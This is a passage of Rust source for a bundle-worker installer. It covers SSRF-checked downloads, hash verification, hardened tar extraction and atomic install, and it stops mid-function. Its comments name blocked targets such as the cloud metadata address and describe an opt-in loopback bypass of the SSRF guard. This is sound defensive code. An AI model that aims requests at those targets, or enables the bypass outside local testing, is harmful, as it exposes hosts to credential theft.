// Copyright Motia LLC and/or licensed to Motia LLC under one or more
// contributor license agreements. Licensed under the Elastic License 2.0;
// you may not use this file except in compliance with the Elastic License 2.0.
// This software is patent protected. We welcome discussions - reach out at team@iii.dev
// See LICENSE and PATENTS files for details.

//! Bundle worker install pipeline.
//!
//! A bundle worker is a tar.gz archive that contains a packaged
//! local-worker directory (an `iii.worker.yaml` manifest plus the
//! bundled application source). The engine resolves the worker via the
//! registry, downloads the archive over HTTPS, verifies its SHA-256,
//! extracts it atomically into `~/.iii/workers-bundle/{name}/`, and
//! then dispatches it through the existing libkrun rails used by
//! local-path workers.
//!
//! Boundary versus the OCI extract path:
//! - `worker_manager::oci::extract_layer_with_limits` is sized for OCI
//!   layers (up to 10 GiB / 1 M entries) and does NOT explicitly reject
//!   symlink/hardlink entries. Bundle workers are publish-time-built
//!   single-binary artifacts; nothing legitimate inside one is a
//!   symlink. We therefore use a dedicated, tighter extractor that
//!   accepts only `Regular` and `Directory` tar entry types and caps
//!   archive size, file count, and path depth aggressively. See
//!   `extract_bundle_safely` for the policy.
//!
//! Atomicity model:
//! - All work happens inside `~/.iii/workers-bundle/.staging/<rand>/`.
//! - A `StagingGuard` holds the fslock for `<name>` and owns the staging
//!   directory. The guard's `Drop` impl removes the staging directory
//!   unless `commit()` has been called. The lock outlives the staging
//!   directory (LIFO drop order), preventing a sibling install from
//!   slipping into a partially-cleaned-up state.
//! - The final step is an atomic `std::fs::rename` from the staging dir
//!   to `~/.iii/workers-bundle/{name}/`. Cross-filesystem renames fall
//!   back to copy-then-delete. A previous install of the same name is
//!   parked aside as a `{name}.old.<unique>` sibling first and restored
//!   if the new install fails (see `atomic_install`).
//!
//! Process-restart safety:
//! - The `Drop` guard cannot run if the process is killed mid-install.
//! - `sweep_orphans()` runs at engine/CLI startup and removes any
//!   leftover staging directories. See T18.
//! - `{name}.old.*` siblings leaked by a replacement that crashed
//!   between rename-aside and cleanup are swept on the next install of
//!   the same worker (`sweep_stale_old_siblings`).

use std::path::{Path, PathBuf};
use std::sync::LazyLock;

use crate::core::error::WorkerOpError;

/// Maximum total uncompressed size of a bundle archive, in bytes.
///
/// Bundle workers are bundled-JS / packaged-Python / single-binary
/// artifacts. 64 MiB covers the realistic upper bound (large JS bundles
/// with embedded assets) without inheriting the OCI extractor's 10 GiB
/// ceiling, which would let a malicious or buggy publish exhaust host
/// disk before validation can run.
pub const MAX_BUNDLE_TOTAL: u64 = 64 * 1024 * 1024;

/// Maximum size of any single file inside a bundle archive.
pub const MAX_BUNDLE_FILE: u64 = 32 * 1024 * 1024;

/// Maximum number of tar entries (files + directories) per archive.
pub const MAX_BUNDLE_ENTRIES: u64 = 1024;

/// Maximum directory depth allowed inside the archive.
pub const MAX_BUNDLE_DEPTH: usize = 16;

/// Maximum size of the `iii.worker.yaml` manifest (64 KiB).
///
/// This is tighter than `MAX_BUNDLE_FILE` because the manifest is parsed
/// in-process by `serde_yaml`, which (as of 0.9.x, libyaml-based) does
/// not gate exponential anchor/alias expansion. A small YAML file with
/// chained aliases can balloon to gigabytes of in-memory `Value`. A
/// 64 KiB cap means even a worst-case expansion stays under a few MiB.
pub const MAX_BUNDLE_MANIFEST_BYTES: u64 = 64 * 1024;

/// Environment variable that explicitly enables the loopback SSRF bypass
/// for local development (e.g. running a Python `http.server` fixture in
/// place of the registry CDN). Mirrors the OCI `III_INSECURE_REGISTRIES`
/// gating: production builds reject `http://localhost/...` / `127.0.0.1`
/// archive URLs by default; operators who need the bypass set
/// `III_BUNDLE_DEV_LOOPBACK=1` and accept the per-install warning.
pub const ENV_BUNDLE_DEV_LOOPBACK: &str = "III_BUNDLE_DEV_LOOPBACK";

/// Environment variable that disables the bundle worker install/start
/// pipeline entirely. Operators who don't trust the registry CDN can
/// set `III_BUNDLE_WORKERS_DISABLED=1` to refuse every bundle worker
/// install and start attempt.
pub const ENV_BUNDLE_WORKERS_DISABLED: &str = "III_BUNDLE_WORKERS_DISABLED";

/// Returns true when the operator has disabled bundle workers via the
/// `III_BUNDLE_WORKERS_DISABLED=1` environment variable. CLI install
/// (`handle_bundle_add`) and engine start (`start_bundle_worker`) both
/// check this gate before doing any network or filesystem work.
pub fn bundle_workers_disabled() -> bool {
    std::env::var(ENV_BUNDLE_WORKERS_DISABLED).ok().as_deref() == Some("1")
}

/// Returns true when the loopback SSRF bypass should fire for
/// `archive_url`. Requires BOTH the env-var gate AND the URL pointing
/// at a literal loopback host. Production builds never satisfy the env
/// var, so the bypass is unreachable there.
pub fn loopback_dev_bypass_enabled(archive_url: &str) -> bool {
    let env_set = std::env::var(ENV_BUNDLE_DEV_LOOPBACK).ok().as_deref() == Some("1");
    env_set && is_loopback_dev_archive_url(archive_url)
}

/// Shared HTTP client for bundle archive downloads. Differs from the
/// registry's `HTTP_CLIENT` (which uses the default reqwest redirect
/// policy of up to 10 hops) in two ways:
///
/// 1. **Per-hop SSRF validation.** Every `Location:` header is re-run
///    through `validate_archive_url_for_ssrf` so a public CDN URL
///    cannot redirect into a non-routable target (loopback, RFC-1918,
///    IMDS, etc.). The initial-URL-only check on `validate_archive_url_for_ssrf`
///    by itself is bypassed by the default redirect-following client.
///    Mirrors the no-redirect posture of `binary_download::NO_REDIRECT_HTTP_CLIENT`.
/// 2. **Hop cap of 5.** A legitimate pre-signed CDN URL needs zero
///    redirects in the common case (S3, Cloudflare R2, GCS sign URLs
///    resolve to the asset directly). Five hops covers the rare CDN
///    chain without leaving room for a redirect bomb.
static BUNDLE_HTTP_CLIENT: LazyLock<reqwest::Client> = LazyLock::new(|| {
    reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(120))
        .redirect(reqwest::redirect::Policy::custom(|attempt| {
            // Copy the URL out so the borrow on `attempt.url()` is
            // released before any consuming method (`error` / `follow`).
            let target = attempt.url().as_str().to_owned();
            // The dev-loopback bypass is intentionally NOT honored for
            // redirects: a public CDN URL must never redirect into
            // localhost, regardless of operator opt-in. The bypass is
            // for direct-to-localhost fetches only.
            if super::download::validate_archive_url_for_ssrf(&target).is_err() {
                return attempt.error(format!(
                    "redirect to non-routable target refused by SSRF guard: {target}"
                ));
            }
            if attempt.previous().len() >= 5 {
                return attempt.error("bundle download exceeded 5 redirects");
            }
            attempt.follow()
        }))
        .build()
        .expect("Failed to create bundle HTTP client")
});

/// Recomputes the SHA-256 of `archive_path` and compares it (case-
/// insensitively) against `expected_sha256_hex`. Used to close the
/// TOCTOU window between `lookup_cached_archive` (which hashes the
/// cache file, then closes it) and `download_archive`'s subsequent
/// `std::fs::copy` (which re-opens the same path by name). Without
/// this re-check, a sibling process that swaps the cache bytes
/// between the two opens can plant arbitrary content under the
/// expected digest.
fn verify_archive_sha256(archive_path: &Path, expected_sha256_hex: &str) -> Result<(), String> {
    use sha2::{Digest, Sha256};
    use std::io::Read as _;
    let mut file =
        std::fs::File::open(archive_path).map_err(|e| format!("open archive for verify: {e}"))?;
    let mut hasher = Sha256::new();
    let mut buf = [0u8; 64 * 1024];
    loop {
        let n = file
            .read(&mut buf)
            .map_err(|e| format!("read archive for verify: {e}"))?;
        if n == 0 {
            break;
        }
        hasher.update(&buf[..n]);
    }
    let actual = format!("{:x}", hasher.finalize());
    if actual.eq_ignore_ascii_case(expected_sha256_hex.trim()) {
        Ok(())
    } else {
        Err(format!(
            "sha256 mismatch: expected {}, got {}",
            expected_sha256_hex.trim(),
            actual
        ))
    }
}

/// Returns the per-worker FS-lock directory used to serialize concurrent
/// `iii worker add <name>` calls.
pub fn bundle_locks_dir() -> PathBuf {
    super::config_file::bundle_workers_dir().join(".locks")
}

/// Returns the staging root where in-flight extracts live.
pub fn bundle_staging_root() -> PathBuf {
    super::config_file::bundle_workers_dir().join(".staging")
}

/// Returns the fslock file path for `name`. Holding this lock excludes
/// other processes from simultaneous install on the same worker.
pub fn lock_path_for(name: &str) -> PathBuf {
    bundle_locks_dir().join(format!("{name}.lock"))
}

/// RAII guard that owns the install-time state: an exclusive fslock and
/// a staging directory. On `Drop`, the staging directory is removed
/// unless `commit()` was called. Rust drops struct fields in
/// **declaration order** (top to bottom), so the staging dir is removed
/// FIRST and the lock is released LAST. That ordering closes the race
/// where a sibling `iii worker add` could acquire the lock and observe
/// a half-cleaned staging directory.
pub struct StagingGuard {
    /// Absolute path of the in-flight extract target. Dropped FIRST so
    /// the staging directory is removed before the lock is released.
    staging_dir: PathBuf,
    /// Set by `commit()` once the atomic rename succeeds.
    committed: bool,
    /// Held for the lifetime of this guard. Declared LAST so it drops
    /// LAST, after `staging_dir`'s cleanup has finished.
    _lock: fslock::LockFile,
}

impl StagingGuard {
    /// Returns the staging directory the caller should write into.
    pub fn staging_dir(&self) -> &Path {
        &self.staging_dir
    }

    /// Marks the install as complete. Drop will leave the staging dir
    /// intact (caller is expected to have already renamed it to its
    /// final home).
    pub fn commit(&mut self) {
        self.committed = true;
    }
}

impl Drop for StagingGuard {
    fn drop(&mut self) {
        if !self.committed && self.staging_dir.exists() {
            // Best-effort cleanup. Errors are non-fatal here:
            // sweep_orphans() at startup is the safety net.
            let _ = std::fs::remove_dir_all(&self.staging_dir);
        }
    }
}

/// Acquires the per-worker fslock and creates a fresh staging directory.
///
/// The lock is acquired via `tokio::task::spawn_blocking` so the async
/// runtime is not blocked on a syscall. The staging directory name is
/// unique per call (timestamp + counter) to allow safe interleaving in
/// the rare case of crash-then-retry.
pub async fn acquire_staging(name: &str) -> Result<StagingGuard, WorkerOpError> {
    super::registry::validate_worker_name(name).map_err(|reason| WorkerOpError::InvalidName {
        name: name.to_string(),
        reason,
    })?;

    let locks_dir = bundle_locks_dir();
    let staging_root = bundle_staging_root();
    std::fs::create_dir_all(&locks_dir).map_err(|source| WorkerOpError::ConfigIo {
        path: locks_dir.clone(),
        source,
    })?;
    std::fs::create_dir_all(&staging_root).map_err(|source| WorkerOpError::ConfigIo {
        path: staging_root.clone(),
        source,
    })?;

    let lock_path = lock_path_for(name);
    let name_for_lock = name.to_string();
    let lock = tokio::task::spawn_blocking(move || -> Result<fslock::LockFile, WorkerOpError> {
        let mut lock =
            fslock::LockFile::open(&lock_path).map_err(|source| WorkerOpError::LockIo {
                path: lock_path.clone(),
                source,
            })?;
        // Blocking acquire: a parallel `iii worker add foo` from
        // another shell must wait for this install to finish, then see
        // AlreadyCurrent on its retry — not immediately error with
        // W111. The whole closure already runs inside spawn_blocking,
        // so blocking syscalls are fine. The blocking call returns
        // when the previous holder exits (graceful or crash); fslock
        // releases on process death so a hung holder eventually clears.
        let _ = name_for_lock;
        lock.lock_with_pid()
            .map_err(|source| WorkerOpError::LockIo {
                path: lock_path.clone(),
                source,
            })?;
        Ok(lock)
    })
    .await
    .map_err(|join_err| WorkerOpError::Internal {
        message: format!("staging lock task panicked: {join_err}"),
    })??;

    let staging_dir = staging_root.join(unique_staging_dir_name(name));
    std::fs::create_dir_all(&staging_dir).map_err(|source| WorkerOpError::ConfigIo {
        path: staging_dir.clone(),
        source,
    })?;

    Ok(StagingGuard {
        _lock: lock,
        staging_dir,
        committed: false,
    })
}

fn unique_staging_dir_name(name: &str) -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let counter = COUNTER.fetch_add(1, Ordering::Relaxed);
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    format!("{name}-{ts}-{counter}")
}

pub async fn download_archive(
    archive_url: &str,
    expected_sha256: &str,
    staging_dir: &Path,
) -> Result<PathBuf, WorkerOpError> {
    let safe_url = super::download::sanitize_url_for_logs(archive_url);
    let started_at = std::time::Instant::now();
    let archive_path = staging_dir.join(".archive.tar.gz");

    // SSRF guard: refuse plain HTTP, file:, ftp:, and literal IP hosts
    // that fall in non-routable / link-local / private ranges (e.g.
    // 169.254.169.254 cloud-IMDS, 10/8 RFC-1918). Done BEFORE the cache
    // fast-path so a hostile URL never even touches local fs lookup;
    // see download.rs::validate_archive_url_for_ssrf for the policy.
    //
    // Dev escape hatch: `localhost` / `127.0.0.1` (and `::1`) bypass
    // the guard ONLY when the operator sets `III_BUNDLE_DEV_LOOPBACK=1`.
    // This mirrors the OCI `III_INSECURE_REGISTRIES` gating — production
    // builds without the env var refuse loopback URLs. A warning is
    // printed on every install so a forgotten env path can't silently
    // enable LAN MITM. See tmp/bundle-worker-test/e2e/serve.py for the
    // intended fixture server (driven by tmp/bundle-worker-test/e2e/run-e2e.sh).
    //
    // Redirect SSRF: the dedicated BUNDLE_HTTP_CLIENT re-runs the SSRF
    // guard on every `Location:` header so a public-hostname URL cannot
    // redirect into a non-routable target. The dev bypass is NOT
    // honored for redirects — only for direct-to-localhost fetches.
    if loopback_dev_bypass_enabled(archive_url) {
        use colored::Colorize as _;
        eprintln!(
            "  {} bundle archive is served from localhost (III_BUNDLE_DEV_LOOPBACK=1) — \
             SSRF guard bypassed for {}. Local-dev only; production installs must \
             use HTTPS CDN URLs.",
            "warning:".yellow(),
            safe_url,
        );
        tracing::warn!(
            bundle.archive_url = %safe_url,
            "bundle.download.ssrf_dev_bypass"
        );
    } else if is_loopback_dev_archive_url(archive_url) {
        // Loopback URL without the env-var opt-in: refuse explicitly so
        // the operator gets a clear error instead of a confusing
        // "DisallowedHost: 127.0.0.1" from the generic SSRF guard.
        tracing::warn!(
            bundle.archive_url = %safe_url,
            "bundle.download.loopback_without_env_gate"
        );
        return Err(WorkerOpError::Download {
            url: safe_url.clone(),
            source: std::io::Error::other(format!(
                "loopback archive URL refused without {ENV_BUNDLE_DEV_LOOPBACK}=1"
            )),
        });
    } else if let Err(e) = super::download::validate_archive_url_for_ssrf(archive_url) {
        tracing::warn!(
            bundle.archive_url = %safe_url,
            error = %e,
            "bundle.download.ssrf_guard_rejected"
        );
        return Err(WorkerOpError::Download {
            url: safe_url.clone(),
            source: std::io::Error::other(format!("{e}")),
        });
    }

    // Cache fast-path. A hit means we already verified this exact blob
    // in a prior install (or someone primed the cache out-of-band). We
    // copy into the staging dir and then RE-HASH the copy: the window
    // between `lookup_cached_archive`'s read (which hashes then closes
    // the cache file) and this `std::fs::copy` (which re-opens by path)
    // is a TOCTOU race a sibling process can exploit by swapping the
    // cache contents (concurrent eviction, manual rm, hostile sibling).
    // The re-verify closes that window.
    if let Some(cached) = lookup_cached_archive(expected_sha256) {
        match std::fs::copy(&cached, &archive_path) {
            Ok(_) => match verify_archive_sha256(&archive_path, expected_sha256) {
                Ok(()) => {
                    tracing::info!(
                        bundle.archive_url = %safe_url,
                        bundle.expected_sha256 = %expected_sha256,
                        cache.source = %cached.display(),
                        bundle.duration_ms = started_at.elapsed().as_millis() as u64,
                        "bundle.download.cache_hit"
                    );
                    return Ok(archive_path);
                }
                Err(reason) => {
                    // Verified-bad cache copy: the cache content was
                    // tampered between lookup hash and copy open. Drop
                    // the corrupt copy, evict the cache entry, and fall
                    // through to a fresh network fetch.
                    let _ = std::fs::remove_file(&archive_path);
                    let _ = std::fs::remove_file(&cached);
                    tracing::warn!(
                        bundle.archive_url = %safe_url,
                        cache.source = %cached.display(),
                        error = %reason,
                        "bundle.download.cache_hit_reverify_failed"
                    );
                }
            },
            Err(e) => {
                // Treat copy failure as a soft cache miss; fall back to
                // the network path so an install never hard-fails on a
                // local fs hiccup.
                tracing::warn!(
                    bundle.archive_url = %safe_url,
                    cache.source = %cached.display(),
                    error = %e,
                    "bundle.download.cache_copy_failed"
                );
            }
        }
    }

    tracing::debug!(
        bundle.archive_url = %safe_url,
        bundle.expected_sha256 = %expected_sha256,
        "bundle.download.start"
    );

    let resp = BUNDLE_HTTP_CLIENT
        .get(archive_url)
        .send()
        .await
        .map_err(|e| {
            tracing::warn!(
                bundle.archive_url = %safe_url,
                error = %e,
                "bundle.download.request_failed"
            );
            WorkerOpError::Download {
                url: safe_url.clone(),
                source: std::io::Error::other(format!("request failed: {e}")),
            }
        })?;

    if !resp.status().is_success() {
        return Err(WorkerOpError::Download {
            url: safe_url.clone(),
            source: std::io::Error::other(format!("HTTP {}", resp.status())),
        });
    }

    let outcome = super::download::stream_response_to_path(
        resp,
        &archive_path,
        super::download::StreamOptions {
            max_size: MAX_BUNDLE_TOTAL,
            allowed_content_type_prefix: Some("application/"),
            url_for_logs: &safe_url,
        },
    )
    .await
    .map_err(|e| WorkerOpError::Download {
        url: safe_url.clone(),
        source: std::io::Error::other(format!("{e}")),
    })?;

    let expected_hex = expected_sha256.trim();
    if !outcome.sha256_hex.eq_ignore_ascii_case(expected_hex) {
        // Delete the verified-bad blob immediately; do not leave it on
        // disk for a later install to mistakenly reuse.
        let _ = std::fs::remove_file(&archive_path);
        tracing::warn!(
            bundle.archive_url = %safe_url,
            bundle.expected_sha256 = %expected_hex,
            bundle.actual_sha256 = %outcome.sha256_hex,
            "bundle.download.sha256_mismatch"
        );
        return Err(WorkerOpError::Download {
            url: safe_url.clone(),
            source: std::io::Error::other(format!(
                "sha256 mismatch: expected {expected_hex}, got {}",
                outcome.sha256_hex,
            )),
        });
    }

    // Best-effort cache insert. Failures here never fail the install —
    // worst case is we re-download next time.
    if let Err(e) = store_in_cache(&archive_path, &outcome.sha256_hex) {
        tracing::warn!(
            bundle.sha256 = %outcome.sha256_hex,
            error = %e,
            "bundle.cache.store_failed"
        );
    }

    tracing::info!(
        bundle.archive_url = %safe_url,
        bundle.bytes = outcome.bytes_written,
        bundle.duration_ms = started_at.elapsed().as_millis() as u64,
        "bundle.download.complete"
    );
    Ok(archive_path)
}

/// Returns true when `archive_url`'s host is `localhost`, `127.0.0.1`,
/// or `::1` — the trio the SSRF guard would otherwise reject.
///
/// Used by `download_archive` to allow a developer's local
/// `http.server` to stand in for the registry CDN during E2E tests.
/// Mirrors the OCI `localhost`/`127.0.0.1` exemption in
/// `worker_manager::oci::insecure_registries` but lives here because
/// the bundle path has its own SSRF guard while OCI does not.
fn is_loopback_dev_archive_url(archive_url: &str) -> bool {
    let Ok(url) = reqwest::Url::parse(archive_url) else {
        return false;
    };
    let Some(host) = url.host_str() else {
        return false;
    };
    // Strip brackets that reqwest leaves around IPv6 hosts.
    let host = host
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .unwrap_or(host)
        .to_ascii_lowercase();
    matches!(host.as_str(), "localhost" | "127.0.0.1" | "::1")
}

/// Async wrapper around the blocking tar extractor.
///
/// Decompression + entry validation are CPU-bound and synchronous;
/// running them on a tokio worker thread would block other tasks for
/// the duration (100-300 ms on a 64 MiB archive on a fast host, much
/// longer on slower disks). Dispatch via `spawn_blocking` so the
/// runtime stays responsive while the archive is unpacked.
pub async fn extract_bundle_safely(archive_path: &Path, dest: &Path) -> Result<(), WorkerOpError> {
    let archive_path = archive_path.to_path_buf();
    let dest = dest.to_path_buf();
    tokio::task::spawn_blocking(move || extract_bundle_safely_blocking(&archive_path, &dest))
        .await
        .map_err(|join_err| WorkerOpError::Internal {
            message: format!("bundle extract task panicked: {join_err}"),
        })?
}

/// Safely extracts a bundle tar.gz archive into `dest` (synchronous).
///
/// Always call via `extract_bundle_safely` from async contexts. Direct
/// callers must be on a blocking thread (tests, CLI sync entrypoints).
///
/// Policy (tighter than the OCI extractor):
/// - Only `Regular` and `Directory` tar entry types are accepted.
///   Everything else (`Symlink`, `Link`, `Char`, `Block`, `Fifo`,
///   `Continuous`, `GNUSparse`, `XGlobalHeader`, ...) is rejected.
/// - Paths must be relative and must not contain `..` components.
/// - Absolute paths (anything starting with `/` or `\`) are rejected.
/// - The total uncompressed size, file count, single-file size, and
///   path depth are all capped (see `MAX_BUNDLE_*` constants).
/// - Setuid/setgid bits are stripped from regular files.
pub fn extract_bundle_safely_blocking(
    archive_path: &Path,
    dest: &Path,
) -> Result<(), WorkerOpError> {
    use flate2::read::GzDecoder;
    use std::fs::File;
    use std::io::Read;
    use tar::EntryType;

    let file = File::open(archive_path).map_err(|e| WorkerOpError::ConfigIo {
        path: archive_path.to_path_buf(),
        source: e,
    })?;
    let gz = GzDecoder::new(file);
    let mut archive = tar::Archive::new(gz);

    // Refuse to follow internal symlinks the tar crate would otherwise
    // resolve. Belt-and-braces with the entry_type filter below.
    archive.set_preserve_permissions(true);
    archive.set_unpack_xattrs(false);
    archive.set_overwrite(true);

    let mut total_bytes: u64 = 0;
    let mut entry_count: u64 = 0;

    let entries = archive
        .entries()
        .map_err(|e| WorkerOpError::BundleArchiveUnsafe {
            reason: format!("failed to read tar entries: {e}"),
            entry: None,
        })?;

    for entry_result in entries {
        let mut entry = entry_result.map_err(|e| WorkerOpError::BundleArchiveUnsafe {
            reason: format!("malformed tar entry: {e}"),
            entry: None,
        })?;

        entry_count += 1;
        if entry_count > MAX_BUNDLE_ENTRIES {
            return Err(WorkerOpError::BundleArchiveUnsafe {
                reason: format!("archive has more than {MAX_BUNDLE_ENTRIES} entries"),
                entry: None,
            });
        }

        let entry_type = entry.header().entry_type();
        if !matches!(entry_type, EntryType::Regular | EntryType::Directory) {
            // Capture the raw path-bytes representation for the error
            // message but do not allow the tar lib to write anything.
            let path_repr = entry
                .path()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "<invalid-utf8>".to_string());
            return Err(WorkerOpError::BundleArchiveUnsafe {
                reason: format!(
                    "rejected tar entry type {entry_type:?}; only Regular and Directory allowed"
                ),
                entry: Some(path_repr),
            });
        }

        // Validate the path: must be relative, no parent traversals,
        // bounded depth.
        let path = entry
            .path()
            .map_err(|e| WorkerOpError::BundleArchiveUnsafe {
                reason: format!("entry has invalid path: {e}"),
                entry: None,
            })?;

        let path_str = path.display().to_string();
        if path.is_absolute() {
            return Err(WorkerOpError::BundleArchiveUnsafe {
                reason: "absolute paths are not allowed".to_string(),
                entry: Some(path_str),
            });
        }

        let mut depth = 0usize;
        for component in path.components() {
            use std::path::Component;
            match component {
                Component::Normal(_) => depth += 1,
                Component::CurDir => {}
                Component::ParentDir => {
                    return Err(WorkerOpError::BundleArchiveUnsafe {
                        reason: "path contains `..` component".to_string(),
                        entry: Some(path_str.clone()),
                    });
                }
                Component::RootDir | Component::Prefix(_) => {
                    return Err(WorkerOpError::BundleArchiveUnsafe {
                        reason: "path contains absolute/prefix component".to_string(),
                        entry: Some(path_str.clone()),
                    });
                }
            }
        }
        if depth > MAX_BUNDLE_DEPTH {
            return Err(WorkerOpError::BundleArchiveUnsafe {
                reason: format!("path depth {depth} exceeds limit {MAX_BUNDLE_DEPTH}"),
                entry: Some(path_str.clone()),
            });
        }

        let size = entry.header().size().unwrap_or(0);
        if size > MAX_BUNDLE_FILE {
            return Err(WorkerOpError::BundleArchiveUnsafe {
                reason: format!(
                    "single file {:.1} MiB exceeds limit {:.1} MiB",
                    size as f64 / 1_048_576.0,
                    MAX_BUNDLE_FILE as f64 / 1_048_576.0,
                ),
                entry: Some(path_str.clone()),
            });
        }
        total_bytes = total_bytes.saturating_add(size);
        if total_bytes > MAX_BUNDLE_TOTAL {
            return Err(WorkerOpError::BundleArchiveUnsafe {
                reason: format!(
                    "uncompressed total exceeds limit {:.1} MiB",
                    MAX_BUNDLE_TOTAL as f64 / 1_048_576.0,
                ),
                entry: Some(path_str.clone()),
            });
        }

        let dest_path = dest.join(&path);
        // Double-check after composition: the canonicalized destination
        // must remain inside `dest`. This is the final guard against
        // any path-traversal we missed above (e.g. unicode normalization).
        match dest_path.strip_prefix(dest) {
            Ok(_) => {}
            Err(_) => {
                return Err(WorkerOpError::BundleArchiveUnsafe {
                    reason: "resolved path escapes destination root".to_string(),
                    entry: Some(path_str.clone()),
                });
            }
        }

        match entry_type {
            EntryType::Directory => {
                std::fs::create_dir_all(&dest_path).map_err(|source| WorkerOpError::ConfigIo {
                    path: dest_path.clone(),
                    source,
                })?;
            }
            EntryType::Regular => {
                if let Some(parent) = dest_path.parent() {
                    std::fs::create_dir_all(parent).map_err(|source| WorkerOpError::ConfigIo {
                        path: parent.to_path_buf(),
                        source,
                    })?;
                }
                let mut out = std::fs::File::create(&dest_path).map_err(|source| {
                    WorkerOpError::ConfigIo {
                        path: dest_path.clone(),
                        source,
                    }
                })?;
                let mut buf = vec![0u8; 64 * 1024];
                let mut written: u64 = 0;
                loop {
                    let n = entry
                        .read(&mut buf)
                        .map_err(|source| WorkerOpError::ConfigIo {
                            path: dest_path.clone(),
                            source,
                        })?;
                    if n == 0 {
                        break;
                    }
                    written += n as u64;
                    if written > MAX_BUNDLE_FILE {
                        return Err(WorkerOpError::BundleArchiveUnsafe {
                            reason: "file body exceeded MAX_BUNDLE_FILE during read".to_string(),
                            entry: Some(path_str.clone()),
                        });
                    }
                    use std::io::Write as _;
                    out.write_all(&buf[..n])
                        .map_err(|source| WorkerOpError::ConfigIo {
                            path: dest_path.clone(),
                            source,
                        })?;
                }

                // Apply the tar header mode so vendored executables
                // keep their +x bit. The mode is masked to 0o0777
                // first, dropping setuid/setgid/sticky — bundles never
                // run elevated.
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt as _;
                    let archive_mode = entry.header().mode().unwrap_or(0o0644);
                    let safe_mode = archive_mode & 0o0777;
                    let perms = std::fs::Permissions::from_mode(safe_mode);
                    let _ = std::fs::set_permissions(&dest_path, perms);
                    // Old setuid-strip block kept guarded for the case
                    // where a previous extractor left bits on disk.
                    if let Ok(metadata) = std::fs::metadata(&dest_path) {
                        let mut perms = metadata.permissions();
                        let mode = perms.mode();
                        let final_mode = mode & 0o0777;
                        if mode != final_mode {
                            perms.set_mode(final_mode);
                            let _ = std::fs::set_permissions(&dest_path, perms);
                        }
                    }
                }
            }
            // Already filtered above.
            _ => unreachable!(),
        }
    }

    Ok(())
}

/// Performs the atomic install step: move the staging dir into its
/// final home at `~/.iii/workers-bundle/{name}/`, REPLACING any
/// previous install of the same name.
///
/// Bundle installs are a machine-wide cache keyed by name, so an add
/// from any project must land the freshly resolved payload rather than
/// keep a possibly-stale one. Replacement is rename-aside: the previous
/// install is renamed to a unique `<final_dir>.old.<unique>` sibling
/// (same-fs, atomic), the new tree is installed via `install_fresh`,
/// and the old sibling is removed best-effort. If the new install
/// fails, the old sibling is renamed back so the previous install is
/// never lost. Callers serialize per-worker through the staging fslock,
/// so the rename-aside dance is not raced in production.
pub fn atomic_install(staging_dir: &Path, name: &str) -> Result<PathBuf, WorkerOpError> {
    let final_dir = super::config_file::bundle_worker_path(name);
    if let Some(parent) = final_dir.parent() {
        std::fs::create_dir_all(parent).map_err(|source| WorkerOpError::ConfigIo {
            path: parent.to_path_buf(),
            source,
        })?;
    }

    sweep_stale_old_siblings(&final_dir);

    if !final_dir.exists() {
        return install_fresh(staging_dir, &final_dir);
    }

    // Move the previous install aside so install_fresh's final rename
    // targets an absent `final_dir`.
    let old_dir = sibling_old_dir(&final_dir);
    if let Err(source) = std::fs::rename(&final_dir, &old_dir) {
        // Nothing has moved yet — the previous install is intact.
        return Err(WorkerOpError::ConfigIo {
            path: final_dir,
            source,
        });
    }

    match install_fresh(staging_dir, &final_dir) {
        Ok(p) => {
            let _ = std::fs::remove_dir_all(&old_dir);
            Ok(p)
        }
        Err(e) => {
            // install_fresh only creates `final_dir` via its last atomic
            // rename, so on failure `final_dir` is absent and the previous
            // install can be restored. The exists() guard is defensive: a
            // freshly-created final must never be clobbered by the old one.
            if final_dir.exists() {
                let _ = std::fs::remove_dir_all(&old_dir);
            } else {
                let _ = std::fs::rename(&old_dir, &final_dir);
            }
            Err(e)
        }
    }
}

/// Installs the staging tree into an absent `final_dir`.
///
/// Same-filesystem fast path: a single `std::fs::rename` swaps the
/// staging tree into its final location in O(1).
///
/// Cross-filesystem fallback (EXDEV/EBUSY): we copy into a sibling
/// temp directory `<final_dir>.partial.<unique>` and only then rename
/// the sibling into `final_dir`. The sibling sits in the same parent
/// directory as the final dir, which guarantees the rename step is on a
/// single filesystem and therefore atomic. If any step of the copy
/// fails, the partial sibling is removed and the original staging dir
/// is left in place for the StagingGuard to clean — `final_dir` is
/// never even touched, so a half-installed worker can never appear
/// under `iii worker list`.
fn install_fresh(staging_dir: &Path, final_dir: &Path) -> Result<PathBuf, WorkerOpError> {
    match std::fs::rename(staging_dir, final_dir) {
        Ok(()) => Ok(final_dir.to_path_buf()),
        Err(e) if cross_device_or_busy(&e) => {
            // Cross-fs path: copy into a sibling of `final_dir` first,
            // then rename. This keeps the final rename inside one
            // filesystem (the bundle root's parent) so it stays atomic;
            // a partial copy can never poison `final_dir`.
            let partial = sibling_partial_dir(final_dir);
            // If a prior crashed install left a stale `*.partial.*`
            // sibling, sweep it before we begin. Best-effort — if remove
            // fails we'll surface the copy error below.
            let _ = std::fs::remove_dir_all(&partial);

            if let Err(source) = copy_dir_tree(staging_dir, &partial) {
                // Roll back the partial sibling so the next install
                // attempt starts clean. The staging dir is left intact
                // for the StagingGuard to clean.
                let _ = std::fs::remove_dir_all(&partial);
                return Err(WorkerOpError::ConfigIo {
                    path: partial,
                    source,
                });
            }

            // Same-filesystem rename: this either succeeds atomically
            // or fails without leaving `final_dir` in a half-state.
            if let Err(source) = std::fs::rename(&partial, final_dir) {
                let _ = std::fs::remove_dir_all(&partial);
                return Err(WorkerOpError::ConfigIo {
                    path: final_dir.to_path_buf(),
                    source,
                });
            }

            // Final step: tidy the now-redundant staging dir. The
            // StagingGuard would also do this on Drop, but doing it
            // here keeps the disk state predictable for the caller.
            let _ = std::fs::remove_dir_all(staging_dir);
            Ok(final_dir.to_path_buf())
        }
        Err(source) => Err(WorkerOpError::ConfigIo {
            path: final_dir.to_path_buf(),
            source,
        }),
    }
}

/// Builds a sibling path next to `final_dir` for the cross-fs copy
/// staging area. Lives in the same parent directory so the subsequent
/// rename into `final_dir` is a same-filesystem atomic rename.
fn sibling_partial_dir(final_dir: &Path) -> PathBuf {
